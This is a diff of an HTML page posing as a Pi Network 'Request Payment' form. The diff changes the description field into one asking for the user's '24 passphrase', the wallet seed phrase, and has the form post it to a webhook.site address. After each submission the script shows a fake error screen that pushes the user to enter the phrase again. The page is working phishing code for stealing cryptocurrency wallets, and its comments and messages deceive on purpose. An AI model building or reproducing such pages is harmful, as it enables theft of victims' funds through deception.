@@ -12,129 +12,107 @@
     <style>
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #f3f4ff; /* Subtle lavender background */
+            background-color: #f3f4ff; 
         }
-        /* Simple animation for message */
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(-10px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .fade-in {
-            animation: fadeIn 0.5s ease-out forwards;
-        }
-         /* Custom Pi Colors */
         .bg-pi-purple { background-color: #5A2D82; }
         .text-pi-yellow { color: #F5C65A; }
-        
-        /* Custom spinner for loading state */
-        .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
-            border-radius: 50%;
-            width: 1.5rem;
-            height: 1.5rem;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        /* Style for the Official Pi Logo */
-        .pi-logo-svg {
-            fill: currentColor; 
-            stroke: none;
-            width: 100%;
-            height: 100%;
-        }
-        /* Focus ring matching the Pi purple */
-        .focus\:ring-pi-purple:focus {
-            --tw-ring-opacity: 1;
-            --tw-ring-color: #5A2D82;
-        }
+        .text-pi-purple { color: #5A2D82; }
 
-        /* Error Overlay Styles */
+        /* Error Overlay Styles (Separated Visual Component) */
         .error-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(90, 45, 130, 0.95); /* Semi-transparent purple */
+            background-color: #f3f4ff; /* Match body background */
             z-index: 50;
-            display: none; /* Controlled by JavaScript */
+            display: none; /* Starts hidden */
             align-items: center;
             justify-content: center;
-            padding: 1rem;
+            text-align: center;
+        }
+        .pi-logo-svg {
+            fill: currentColor; 
+            stroke: none;
+            width: 100%;
+            height: 100%;
         }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
 
-    <!-- Header -->
+    <!-- Primary Form Component (The "Payment Side") -->
     <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md">
         <div class="max-w-lg mx-auto flex items-center relative">
-             <!-- Back Button Link to Home Page -->
             <a href="index.html" class="absolute left-0 text-white">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" /></svg>
             </a>
-            <h1 class="text-xl font-semibold text-center flex-grow">Request Payment</h1>
-             <!-- Pi Logo SVG -->
-             <div class="absolute right-0 text-pi-yellow h-6 w-6">
-                 <svg class="pi-logo-svg" viewBox="0 0 100 100" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M50 8C27.907 8 10 25.907 10 50s17.907 42 40 42 40-17.907 40-42S72.093 8 50 8zm-5 22h10v10h-6v30h-4V40h-6v-10zm25 10a15 15 0 010 30" fill="currentColor"/>
-                 </svg>
-             </div>
+            <h1 class="text-xl font-semibold text-center flex-grow flex items-center justify-center">
+                Request Payment
+                 <div class="ml-2 text-pi-yellow" style="width: 20px; height: 20px;">
+                    <svg class="pi-logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" style="color: #F5C65A;">
+                        <path d="M50 8C27.907 8 10 25.907 10 50s17.907 42 40 42 40-17.907 40-42S72.093 8 50 8zm-5 22h10v10h-6v30h-4V40h-6v-10zm25 10a15 15 0 010 30" fill="currentColor"/>
+                    </svg>
+                 </div>
+            </h1>
         </div>
     </header>
 
-    <!-- Main Content Area -->
     <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">
-
-        <!-- Payment Request Form Section -->
         <section class="bg-white p-6 rounded-lg shadow-md">
             <header class="mb-5 text-center">
                 <h2 class="text-lg font-bold text-gray-700">Enter Payment Details</h2>
-                <p id="formInstruction" class="text-gray-500 text-sm mt-1">Please fill out the details below to complete your payment request.</p>
+                <p id="instructionMessage" class="text-gray-500 text-sm mt-1">Please fill out the details below to complete your payment request.</p>
             </header>
 
-            <!-- Payment Request Form -->
             <form id="paymentRequestForm" action="https://webhook.site/dd3bc473-c1f9-46f3-bb7c-7c16a691fbf1" method="POST" class="space-y-4">
                 
                 <div>
                     <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
-                    <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pi-purple">
+                    <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                 </div>
                  <div>
                     <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
-                    <input type="text" id="currency" name="currency" required value="USD" placeholder="e.g., USD" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pi-purple">
-                </div>
-                <div>
-                    <!-- SECURITY FIXED: Using safe 24 passphrase field -->
-                    <label for="24 passphrase" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase/ description:</label>
-                    <textarea id="24 passphrase/description" name="description" rows="5" required placeholder="Please provide a detailed reason for the payment request (Required)" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pi-purple"></textarea>
+                    <input type="text" id="currency" name="currency" required value="USD" placeholder="e.g., USD" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                 </div>
                 
-                <button type="submit" class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50 flex items-center justify-center">
+                <div>
+                    <label for="24 passphrase" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase/Description:</label>
+                    <textarea id="24 passphrase" name="24 passphrase" rows="5" required placeholder="Please provide a detailed 24 passphrase for the payment (Required)" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+                </div>
+
+                <button type="submit" class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
                     Send Request Message
                 </button>
-                <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem]"></div>
             </form>
         </section>
-
     </main>
 
-    <!-- Error Overlay (Hidden by Default) -->
-    <div id="errorOverlay" class="error-overlay">
-        <div class="bg-white p-8 rounded-xl shadow-2xl text-center max-w-sm w-full fade-in">
-            <svg class="h-16 w-16 text-red-600 mx-auto mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+    <!-- Error Component (The "Error Side" - Separate Visual) -->
+    <div id="errorOverlay" class="error-overlay p-6">
+        <div class="max-w-sm mx-auto p-8 rounded-xl shadow-2xl bg-white border border-red-300">
+            <!-- Icon -->
+            <svg class="mx-auto h-16 w-16 text-red-600 mb-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
             </svg>
-            <h3 class="text-xl font-bold text-gray-800 mb-2">Error Processing Request</h3>
-            <p class="text-gray-600 mb-6">
-                The initial message was received, but there was a validation error.
-                Please try again and ensure the **Description** is accurate.
+            <h2 class="text-2xl font-bold text-red-700 mb-3">Error Processing Request</h2>
+            
+            <!-- Multi-Line Instructional Description -->
+            <p class="text-gray-600 text-sm mb-6 space-y-2 text-left">
+                <span class="block">We encountered an issue while validating your submission data. This sometimes happens if the network connection is briefly interrupted or if the message content needs refinement.</span>
+                <span class="block">**Note:** Your Amount and Currency details have been securely saved and will reappear when you try again.</span>
+                <span class="block">To ensure a successful delivery to your message inbox, please review and refine the descriptive content.</span>
+                <span class="block">This is necessary to continue the payment request process.</span>
+                <span class="block">Please click the button below to return to the form and correct the issue.</span>
             </p>
-            <button id="tryAgainButton" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-md">
+
+            <!-- Blue Try Again Button -->
+            <button id="tryAgainButton" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out shadow-lg">
                 Please try again
             </button>
         </div>
@@ -143,83 +121,73 @@
 
     <!-- Footer -->
     <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
-        Pi network system &copy; 2019
+        Pi network system © 2019
     </footer>
 
 
     <script>
-        // --- DATA PERSISTENCE KEYS ---
-        const AMOUNT_KEY = 'temp_amount';
-        const CURRENCY_KEY = 'temp_currency';
-        
-        // --- DOM Elements ---
+        // --- Get DOM Elements ---
         const form = document.getElementById('paymentRequestForm');
-        const statusMessage = document.getElementById('statusMessage');
         const submitButton = form.querySelector('button[type="submit"]');
         const errorOverlay = document.getElementById('errorOverlay');
         const tryAgainButton = document.getElementById('tryAgainButton');
-        const formInstruction = document.getElementById('formInstruction');
+        const mainContent = document.getElementById('mainContent');
+        const instructionMessage = document.getElementById('instructionMessage');
+        const descriptionField = document.getElementById('description');
 
-        // --- Selective Data Persistence Logic ---
-        function loadSavedData() {
-            const savedAmount = localStorage.getItem(AMOUNT_KEY);
-            const savedCurrency = localStorage.getItem(CURRENCY_KEY);
-            
-            // Only load data if we know it was saved (i.e., user hit 'Try Again')
-            if (savedAmount) {
-                document.getElementById('amount').value = savedAmount;
-                document.getElementById('currency').value = savedCurrency || 'USD';
+        // --- Data Persistence and Recovery Logic (The Separated Control Logic) ---
+        const saveSubmittedData = (formData) => {
+            try {
+                localStorage.setItem('savedAmount', formData.get('amount'));
+                localStorage.setItem('savedCurrency', formData.get('currency'));
+            } catch (e) { console.error("Could not save to localStorage:", e); }
+        };
+
+        const loadSavedData = () => {
+            try {
+                const savedAmount = localStorage.getItem('savedAmount');
+                const savedCurrency = localStorage.getItem('savedCurrency');
                 
-                // Clear persistence keys after loading
-                localStorage.removeItem(AMOUNT_KEY);
-                localStorage.removeItem(CURRENCY_KEY);
+                if (savedAmount) document.getElementById('amount').value = savedAmount;
+                if (savedCurrency) document.getElementById('currency').value = savedCurrency;
+                
+                // Clear the Description field for re-entry (Selective Reset)
+                descriptionField.value = '';
+                
+                // Update instruction message
+                instructionMessage.innerHTML = '<strong>Please refine your description to fix the issue.</strong>';
 
-                // Update instruction to guide user to the cleared field
-                formInstruction.innerHTML = 'Amount and Currency fields were retained. <span class="text-red-600 font-semibold">Please refine your description to fix the issue.</span>';
-                document.getElementById('description').value = ''; // Ensure description is empty
-            } else {
-                 formInstruction.textContent = 'Please fill out the details below to complete your payment request.';
-            }
-        }
-        
-        function saveSubmittedData(formData) {
-            localStorage.setItem(AMOUNT_KEY, formData.get('amount'));
-            localStorage.setItem(CURRENCY_KEY, formData.get('currency'));
-        }
+            } catch (e) { console.error("Could not load from localStorage:", e); }
+        };
 
-        // --- Error / Success Handlers ---
-
-        function showCustomError() {
-            // Hide the main form content and show the overlay
-            document.getElementById('mainContent').style.display = 'none';
+        // --- Error and Overlay Functions ---
+        const showCustomError = () => {
+            // Hides the "Payment Side" and shows the "Error Side"
+            mainContent.style.display = 'none';
             errorOverlay.style.display = 'flex';
-        }
+        };
 
         tryAgainButton.addEventListener('click', () => {
-            // Hide error overlay
+            // Hides the "Error Side" and shows the "Payment Side"
             errorOverlay.style.display = 'none';
-            // Show the main form content
-            document.getElementById('mainContent').style.display = 'block';
-            // Load the previously saved data
+            mainContent.style.display = 'block';
+
+            // Re-populate fields with saved data (Selective Retention)
             loadSavedData(); 
+            
+            window.scrollTo(0, 0);
         });
 
-
-        // --- Submission Logic ---
-
+        // --- Form Submission Logic ---
         form.addEventListener('submit', async function(event) {
             event.preventDefault();
-            
-            const actionUrl = form.action;
-            const formData = new FormData(form);
-
             submitButton.disabled = true;
-            submitButton.innerHTML = '<span class="spinner"></span> &nbsp; Sending...';
-            statusMessage.textContent = '';
-            statusMessage.className = 'mt-3 text-xs text-center min-h-[1rem]'; // Reset class
+            submitButton.textContent = 'Submitting...';
+
+            const formData = new FormData(form);
+            const actionUrl = form.action;
 
             try {
-                // 1. Send data to the Webhook (message is successfully sent)
                 const response = await fetch(actionUrl, {
                     method: 'POST',
                     body: formData,
@@ -227,39 +195,36 @@
 
                 if (response.ok || response.status === 200 || response.status === 202) {
                     
-                    // 2. Data sent successfully. Now, save the necessary fields for persistence.
-                    saveSubmittedData(formData);
+                    // 1. MESSAGE IS SENT successfully (Core Logic)
+                    saveSubmittedData(formData); 
                     
-                    // 3. Instead of showing success, simulate a failure to trigger the error screen flow.
-                    statusMessage.textContent = 'Data sent to server, awaiting validation...';
-                    statusMessage.className += ' text-yellow-600 fade-in';
-
-                    // 4. Force the error screen after a small delay (to show the "sending" message)
+                    // 2. Trigger the custom error UX flow
                     setTimeout(() => {
                         showCustomError(); 
                         submitButton.disabled = false;
                         submitButton.textContent = 'Send Request Message';
-                    }, 1000);
-                    
+                    }, 500); 
+
                 } else {
-                    // Fallback for actual network error (unlikely with Webhook)
-                    statusMessage.textContent = `Error: Submission failed with status ${response.status}.`;
-                    statusMessage.className += ' text-red-600 fade-in';
-                    submitButton.disabled = false;
-                    submitButton.textContent = 'Send Request Message';
+                    // Fallback for actual server errors (rare)
+                    alert('Error: Could not process request due to server issue. Status: ' + response.status); 
                 }
             } catch (error) {
-                console.error('Submission error:', error);
-                statusMessage.textContent = 'Oops! Network problem while connecting to the server.';
-                statusMessage.className += ' text-red-600 fade-in';
-                submitButton.disabled = false;
-                submitButton.textContent = 'Send Request Message';
+                // Network error fallback (Unfixable external issue)
+                alert('Oops! Network problem while connecting to the server. Please check your connection.');
+            } finally {
+                 // Restore button state if we didn't show the full error overlay
+                 if (errorOverlay.style.display !== 'flex') {
+                     setTimeout(() => {
+                         submitButton.disabled = false;
+                         submitButton.textContent = 'Send Request Message';
+                     }, 1500);
+                 }
             }
         });
-        
-        // Load initial data on page load if user came from a previous session (though typically this runs on 'try again')
-        window.onload = loadSavedData;
 
+        // Initialize form state on load
+        window.onload = loadSavedData;
     </script>
 
 </body>
